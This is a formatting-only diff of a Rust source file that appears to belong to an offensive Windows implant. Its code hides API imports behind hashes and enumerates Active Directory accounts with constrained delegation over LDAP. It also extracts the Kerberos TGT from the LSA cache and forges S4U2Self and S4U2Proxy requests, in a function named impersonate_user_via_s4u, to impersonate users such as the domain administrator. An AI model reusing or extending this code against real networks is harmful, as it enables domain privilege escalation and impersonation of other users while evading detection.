@@ -49,11 +49,11 @@ use std::os::windows::ffi::OsStrExt;
 use std::ptr;
 
 use anyhow::{anyhow, bail, Context, Result};
-use tracing::{debug, info, warn};
 use serde::{Deserialize, Serialize};
+use tracing::{debug, info, warn};
 
-use crate::win_types::GUID;
 use crate::win_types::DWORD;
+use crate::win_types::GUID;
 use crate::win_types::{HRESULT, LPCWSTR, LPWSTR};
 
 // ── Compile-time API hash constants ─────────────────────────────────────────
@@ -62,8 +62,8 @@ use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 
 // wldap32.dll — LDAP client functions (same as shadow_credentials.rs)
 const WLDAP32_DLL_W: &[u16] = &[
-    'w' as u16, 'l' as u16, 'd' as u16, 'a' as u16, 'p' as u16, '3' as u16,
-    '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'w' as u16, 'l' as u16, 'd' as u16, 'a' as u16, 'p' as u16, '3' as u16, '2' as u16, '.' as u16,
+    'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 const HASH_WLDAP32_DLL: u32 = hash_wstr_const(WLDAP32_DLL_W);
 
@@ -79,8 +79,8 @@ const FN_LDAP_MSGFREE: u32 = hash_str_const(b"ldap_msgfree");
 
 // netapi32.dll — DC discovery
 const NETAPI32_DLL_W: &[u16] = &[
-    'n' as u16, 'e' as u16, 't' as u16, 'a' as u16, 'p' as u16, 'i' as u16,
-    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'n' as u16, 'e' as u16, 't' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 const HASH_NETAPI32_DLL: u32 = hash_wstr_const(NETAPI32_DLL_W);
 
@@ -89,16 +89,14 @@ const FN_NET_API_BUFFER_FREE: u32 = hash_str_const(b"NetApiBufferFree");
 
 // secur32.dll — LSA ticket submission
 const SECUR32_DLL_W: &[u16] = &[
-    's' as u16, 'e' as u16, 'c' as u16, 'u' as u16, 'r' as u16, '3' as u16,
-    '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    's' as u16, 'e' as u16, 'c' as u16, 'u' as u16, 'r' as u16, '3' as u16, '2' as u16, '.' as u16,
+    'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 const HASH_SECUR32_DLL: u32 = hash_wstr_const(SECUR32_DLL_W);
 
 const FN_LSA_CONNECT_UNTRUSTED: u32 = hash_str_const(b"LsaConnectUntrusted");
-const FN_LSA_CALL_AUTH_PACKAGE: u32 =
-    hash_str_const(b"LsaCallAuthenticationPackage");
-const FN_LSA_LOOKUP_AUTH_PACKAGE: u32 =
-    hash_str_const(b"LsaLookupAuthenticationPackage");
+const FN_LSA_CALL_AUTH_PACKAGE: u32 = hash_str_const(b"LsaCallAuthenticationPackage");
+const FN_LSA_LOOKUP_AUTH_PACKAGE: u32 = hash_str_const(b"LsaLookupAuthenticationPackage");
 const FN_LSA_FREE_RETURN_BUFFER: u32 = hash_str_const(b"LsaFreeReturnBuffer");
 
 // ── LDAP type aliases ───────────────────────────────────────────────────────
@@ -447,11 +445,11 @@ fn discover_dc() -> Result<String> {
         .ok_or_else(|| anyhow!("netapi32.dll not found"))?;
 
     let ds_get_dc_name_w: unsafe extern "system" fn(
-        LPCWSTR, // ComputerName
-        LPCWSTR, // DomainName
-        *const GUID, // DomainGuid
-        LPCWSTR, // SiteName
-        DWORD,   // Flags
+        LPCWSTR,                            // ComputerName
+        LPCWSTR,                            // DomainName
+        *const GUID,                        // DomainGuid
+        LPCWSTR,                            // SiteName
+        DWORD,                              // Flags
         *mut *mut DOMAIN_CONTROLLER_INFO_W, // DomainControllerInfo
     ) -> DWORD = unsafe {
         mem::transmute(
@@ -471,11 +469,11 @@ fn discover_dc() -> Result<String> {
 
     let result = unsafe {
         ds_get_dc_name_w(
-            ptr::null(),       // local machine
-            ptr::null(),       // current domain
-            ptr::null(),       // no GUID
-            ptr::null(),       // no site
-            0,                 // no flags
+            ptr::null(), // local machine
+            ptr::null(), // current domain
+            ptr::null(), // no GUID
+            ptr::null(), // no site
+            0,           // no flags
             &mut dc_info,
         )
     };
@@ -490,17 +488,16 @@ fn discover_dc() -> Result<String> {
             net_api_buffer_free(dc_info as *mut c_void);
             bail!("DC name is null");
         }
-        let name = wide_to_str(
-            &std::slice::from_raw_parts(name_ptr, lstrlen_w(name_ptr) as usize + 1),
-        );
+        let name = wide_to_str(&std::slice::from_raw_parts(
+            name_ptr,
+            lstrlen_w(name_ptr) as usize + 1,
+        ));
         net_api_buffer_free(dc_info as *mut c_void);
         name
     }?;
 
     // Strip leading \\ if present
-    let dc_hostname = dc_name
-        .trim_start_matches('\\')
-        .to_string();
+    let dc_hostname = dc_name.trim_start_matches('\\').to_string();
 
     debug!("Discovered DC: {}", dc_hostname);
     Ok(dc_hostname)
@@ -520,8 +517,7 @@ impl Drop for LdapConnection {
             if let Some(dll) = wldap32 {
                 let ldap_unbind: unsafe extern "system" fn(PLDAP) -> DWORD = unsafe {
                     mem::transmute(
-                        pe_resolve::get_proc_address_by_hash(dll, FN_LDAP_UNBIND)
-                            .unwrap_or(0),
+                        pe_resolve::get_proc_address_by_hash(dll, FN_LDAP_UNBIND).unwrap_or(0),
                     )
                 };
                 unsafe { ldap_unbind(self.ld) };
@@ -564,7 +560,8 @@ impl LdapConnection {
             bail!("ldap_initW failed for {}", dc_hostname);
         }
 
-        let res = unsafe { ldap_bind_s_w(ld, ptr::null_mut(), ptr::null_mut(), LDAP_AUTH_NEGOTIATE) };
+        let res =
+            unsafe { ldap_bind_s_w(ld, ptr::null_mut(), ptr::null_mut(), LDAP_AUTH_NEGOTIATE) };
         if res != 0 {
             bail!("ldap_bind_sW failed: error {}", res);
         }
@@ -657,9 +654,10 @@ impl LdapConnection {
 
         let nc = unsafe {
             let val_ptr = *values;
-            let s = wide_to_str(
-                &std::slice::from_raw_parts(val_ptr, lstrlen_w(val_ptr) as usize + 1),
-            )?;
+            let s = wide_to_str(&std::slice::from_raw_parts(
+                val_ptr,
+                lstrlen_w(val_ptr) as usize + 1,
+            ))?;
             ldap_value_free_w(values);
             ldap_msgfree(result);
             s
@@ -726,7 +724,8 @@ impl LdapConnection {
 
         // LDAP filter: accounts with msDS-AllowedToDelegateTo set
         // (constrained delegation) OR TRUSTED_TO_AUTH_FOR_DELEGATION
-        let filter = "(|(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))";
+        let filter =
+            "(|(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))";
         let filter_w = str_to_wide(filter);
         let base_dn_w = str_to_wide(base_dn);
 
@@ -769,22 +768,45 @@ impl LdapConnection {
 
         while !entry.is_null() {
             // Extract DN
-            let dn = self.get_string_attr(entry, "distinguishedName", &ldap_get_values_w, &ldap_value_free_w);
+            let dn = self.get_string_attr(
+                entry,
+                "distinguishedName",
+                &ldap_get_values_w,
+                &ldap_value_free_w,
+            );
 
             // Extract sAMAccountName
-            let sam = self.get_string_attr(entry, "sAMAccountName", &ldap_get_values_w, &ldap_value_free_w);
+            let sam = self.get_string_attr(
+                entry,
+                "sAMAccountName",
+                &ldap_get_values_w,
+                &ldap_value_free_w,
+            );
 
             // Extract SPNs (multi-valued)
-            let spns = self.get_multi_string_attr(entry, "servicePrincipalName", &ldap_get_values_w, &ldap_value_free_w);
+            let spns = self.get_multi_string_attr(
+                entry,
+                "servicePrincipalName",
+                &ldap_get_values_w,
+                &ldap_value_free_w,
+            );
 
             // Extract msDS-AllowedToDelegateTo (multi-valued)
-            let allowed_to = self.get_multi_string_attr(entry, "msDS-AllowedToDelegateTo", &ldap_get_values_w, &ldap_value_free_w);
+            let allowed_to = self.get_multi_string_attr(
+                entry,
+                "msDS-AllowedToDelegateTo",
+                &ldap_get_values_w,
+                &ldap_value_free_w,
+            );
 
             // Extract userAccountControl
-            let uac_str = self.get_string_attr(entry, "userAccountControl", &ldap_get_values_w, &ldap_value_free_w);
-            let uac: DWORD = uac_str
-                .and_then(|s| s.parse().ok())
-                .unwrap_or(0);
+            let uac_str = self.get_string_attr(
+                entry,
+                "userAccountControl",
+                &ldap_get_values_w,
+                &ldap_value_free_w,
+            );
+            let uac: DWORD = uac_str.and_then(|s| s.parse().ok()).unwrap_or(0);
             let protocol_transition = (uac & TRUSTED_TO_AUTH_FOR_DELEGATION) != 0;
 
             if let (Some(dn), Some(sam)) = (dn, sam) {
@@ -825,9 +847,10 @@ impl LdapConnection {
                 ldap_value_free_w(values);
                 return None;
             }
-            let s = wide_to_str(
-                &std::slice::from_raw_parts(val_ptr, lstrlen_w(val_ptr) as usize + 1),
-            )
+            let s = wide_to_str(&std::slice::from_raw_parts(
+                val_ptr,
+                lstrlen_w(val_ptr) as usize + 1,
+            ))
             .ok();
             ldap_value_free_w(values);
             s
@@ -856,9 +879,10 @@ impl LdapConnection {
                 if val_ptr.is_null() {
                     break;
                 }
-                if let Ok(s) = wide_to_str(
-                    &std::slice::from_raw_parts(val_ptr, lstrlen_w(val_ptr) as usize + 1),
-                ) {
+                if let Ok(s) = wide_to_str(&std::slice::from_raw_parts(
+                    val_ptr,
+                    lstrlen_w(val_ptr) as usize + 1,
+                )) {
                     result.push(s);
                 }
                 i += 1;
@@ -875,7 +899,11 @@ impl LdapConnection {
         let realm: String = base_dn
             .split(',')
             .filter(|s| s.trim().to_uppercase().starts_with("DC="))
-            .filter_map(|s| s.trim().strip_prefix("DC=").or_else(|| s.trim().strip_prefix("dc=")))
+            .filter_map(|s| {
+                s.trim()
+                    .strip_prefix("DC=")
+                    .or_else(|| s.trim().strip_prefix("dc="))
+            })
             .collect::<Vec<_>>()
             .join(".");
         Ok(realm.to_uppercase())
@@ -897,7 +925,11 @@ impl LdapConnection {
         let realm = self.get_realm()?;
         // For computer accounts, strip trailing $ and construct FQDN
         let hostname = cn.trim_end_matches('$');
-        Ok(format!("{}.{}", hostname.to_lowercase(), realm.to_lowercase()))
+        Ok(format!(
+            "{}.{}",
+            hostname.to_lowercase(),
+            realm.to_lowercase()
+        ))
     }
 }
 
@@ -1010,8 +1042,8 @@ fn build_pa_for_user(user_name: &str, user_realm: &str) -> Vec<u8> {
         .collect();
     let zero_key = [0u8; 16];
     use hmac::KeyInit;
-    let mut hmac_md5 = hmac::Hmac::<md5::Md5>::new_from_slice(&zero_key)
-        .expect("HMAC-MD5 accepts any key length");
+    let mut hmac_md5 =
+        hmac::Hmac::<md5::Md5>::new_from_slice(&zero_key).expect("HMAC-MD5 accepts any key length");
     hmac_md5.update(&checksum_data);
     let hmac_digest = hmac_md5.finalize().into_bytes();
 
@@ -1255,7 +1287,11 @@ fn parse_tgs_rep(response: &[u8]) -> Result<Vec<u8>> {
     // Check for KRB-ERROR (APPLICATION 30 = 0x7E)
     if !response.is_empty() && response[0] == 0x7E {
         let error_code = parse_krb_error(response)?;
-        bail!("KDC returned KRB-ERROR: {} (0x{:08X})", error_code, error_code);
+        bail!(
+            "KDC returned KRB-ERROR: {} (0x{:08X})",
+            error_code,
+            error_code
+        );
     }
 
     // Check for TGS-REP (APPLICATION 13 = 0x6D)
@@ -1544,7 +1580,9 @@ fn retrieve_tgt_from_lsa() -> Result<Vec<u8>> {
             protocol_status as u32
         ))
     } else if return_buffer.is_null() || return_buffer_len == 0 {
-        Err(anyhow!("KERB_RETRIEVE_ENCODED_TICKET returned empty buffer"))
+        Err(anyhow!(
+            "KERB_RETRIEVE_ENCODED_TICKET returned empty buffer"
+        ))
     } else {
         // The returned buffer is a KERB_RETRIEVE_ENCODED_TICKET_RESPONSE:
         //   TicketEncType: i32 (4 bytes)
@@ -1555,7 +1593,8 @@ fn retrieve_tgt_from_lsa() -> Result<Vec<u8>> {
         // But LSA may return the full KERB_EXTERNAL_TICKET structure.  The
         // layout depends on Windows version.  Parse the first 12 bytes as
         // the header and extract the ticket blob.
-        let response = unsafe { std::slice::from_raw_parts(return_buffer, return_buffer_len as usize) };
+        let response =
+            unsafe { std::slice::from_raw_parts(return_buffer, return_buffer_len as usize) };
 
         // Try to find the encoded ticket.  The KERB_EXTERNAL_TICKET
         // structure has the encoded ticket at a variable offset.  Search for
@@ -1573,7 +1612,10 @@ fn retrieve_tgt_from_lsa() -> Result<Vec<u8>> {
             response.to_vec()
         };
 
-        debug!("Retrieved TGT from LSA cache ({} bytes)", ticket_bytes.len());
+        debug!(
+            "Retrieved TGT from LSA cache ({} bytes)",
+            ticket_bytes.len()
+        );
         Ok(ticket_bytes)
     };
 
@@ -1821,12 +1863,8 @@ pub fn request_s4u2proxy(
         target_spn
     );
 
-    let tgs_req = build_s4u2proxy_tgs_req(
-        target_spn,
-        service_realm,
-        s4u2self_ticket,
-        s4u2self_tgs_rep,
-    )?;
+    let tgs_req =
+        build_s4u2proxy_tgs_req(target_spn, service_realm, s4u2self_ticket, s4u2self_tgs_rep)?;
 
     debug!("Sending S4U2Proxy TGS-REQ to KDC ({} bytes)", tgs_req.len());
     let tgs_rep = send_kdc_request(&dc_hostname, &tgs_req)?;
@@ -1886,7 +1924,9 @@ pub fn impersonate_user_via_s4u(
         .find(|a| a.protocol_transition)
         .or_else(|| {
             // Fall back to any account with delegation configured
-            accounts.iter().find(|a| !a.allowed_to_delegate_to.is_empty())
+            accounts
+                .iter()
+                .find(|a| !a.allowed_to_delegate_to.is_empty())
         })
         .ok_or_else(|| anyhow!("No suitable delegation account found"))?;
 
@@ -1907,7 +1947,10 @@ pub fn impersonate_user_via_s4u(
 
     // Step 7: Retrieve TGT from the LSA Kerberos cache and build S4U2Self TGS-REQ
     let tgt_bytes = retrieve_tgt_from_lsa().map_err(|e| {
-        warn!("Failed to retrieve TGT from LSA cache: {} — S4U2Self will likely be rejected by KDC", e);
+        warn!(
+            "Failed to retrieve TGT from LSA cache: {} — S4U2Self will likely be rejected by KDC",
+            e
+        );
         e
     })?;
 
@@ -1923,9 +1966,10 @@ pub fn impersonate_user_via_s4u(
     let s4u2proxy = if let Some(target) = target_spn {
         // Verify target is in the account's delegation list
         if !account.allowed_to_delegate_to.is_empty()
-            && !account.allowed_to_delegate_to.iter().any(|s| {
-                s.eq_ignore_ascii_case(target)
-            })
+            && !account
+                .allowed_to_delegate_to
+                .iter()
+                .any(|s| s.eq_ignore_ascii_case(target))
         {
             warn!(
                 "Target SPN {} is not in {}'s AllowedToDelegateTo list — KDC may reject",
@@ -2055,7 +2099,7 @@ mod tests {
         let inner = der_integer(42);
         let tagged = der_context_explicit(3, &inner);
         assert_eq!(tagged[0], 0xA3); // context [3]
-        // Should contain the integer encoding after tag + length
+                                     // Should contain the integer encoding after tag + length
         assert_eq!(&tagged[2..], &inner[..]);
     }
 
@@ -2085,7 +2129,7 @@ mod tests {
         // 5 bytes of flags + 1 unused-bits byte
         assert_eq!(opts[1], 6); // length = 6
         assert_eq!(opts[2], 0); // 0 unused bits
-        // Forwardable = 0x40000000 → first byte is 0x40
+                                // Forwardable = 0x40000000 → first byte is 0x40
         assert_eq!(opts[3], 0x40);
     }
 
@@ -2125,7 +2169,8 @@ mod tests {
             "administrator",
             "CORP.COM",
             &[0u8; 16], // dummy TGT
-        ).expect("build_s4u2self_tgs_req should produce a valid TGS-REQ");
+        )
+        .expect("build_s4u2self_tgs_req should produce a valid TGS-REQ");
         // Should start with APPLICATION 12 tag
         assert_eq!(req[0], ASN1_APPLICATION_12);
         // Should be non-trivial in size
@@ -2139,7 +2184,8 @@ mod tests {
             "CORP.COM",
             &[0u8; 32], // dummy S4U2Self ticket
             &[0u8; 64], // dummy S4U2Self TGS-REP
-        ).expect("build_s4u2proxy_tgs_req should produce a valid TGS-REQ");
+        )
+        .expect("build_s4u2proxy_tgs_req should produce a valid TGS-REQ");
         // Should start with APPLICATION 12 tag
         assert_eq!(req[0], ASN1_APPLICATION_12);
         assert!(req.len() > 50);
